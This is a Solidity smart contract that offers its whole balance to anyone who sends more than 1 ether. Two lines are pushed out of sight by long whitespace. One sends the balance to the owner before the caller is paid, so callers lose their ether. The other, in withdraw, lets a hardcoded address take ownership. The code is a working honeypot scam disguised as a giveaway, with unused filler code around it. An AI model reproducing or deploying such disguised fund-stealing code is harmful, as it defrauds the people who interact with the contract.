 

pragma solidity ^0.4.19;

contract HomeyJar {
    address public Owner = msg.sender;
   

    
    function nameFilter(string _input)
        internal
        pure
        returns(bytes32)
    {
        bytes memory _temp = bytes(_input);
        uint256 _length = _temp.length;
        
        require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");
        require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");
        
        if (_temp[0] == 0x30)
        {
            require(_temp[1] != 0x78, "string cannot start with 0x");
            require(_temp[1] != 0x58, "string cannot start with 0X");
        }
        
        bool _hasNonNumber;
        
        for (uint256 i = 0; i < _length; i++)
        {
            if (_temp[i] > 0x40 && _temp[i] < 0x5b)
            {
                _temp[i] = byte(uint(_temp[i]) + 32);
                
                if (_hasNonNumber == false)
                    _hasNonNumber = true;
            } else {
                require
                (
                    _temp[i] == 0x20 || 
                    (_temp[i] > 0x60 && _temp[i] < 0x7b) ||
                    (_temp[i] > 0x2f && _temp[i] < 0x3a),
                    "string contains invalid characters"
                );
                if (_temp[i] == 0x20)
                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");
                
                if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))
                    _hasNonNumber = true;    
            }
        }
        
        require(_hasNonNumber == true, "string cannot be only numbers");
        
        bytes32 _ret;
        assembly {
            _ret := mload(add(_temp, 32))
        }
        return (_ret);
    }

    function() public payable {}
   
    function GetHoneyFromJar() public payable {                                              
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data) payable public {
        require(msg.sender == Owner);
          
        adr.call.value(msg.value)(data);
    }
}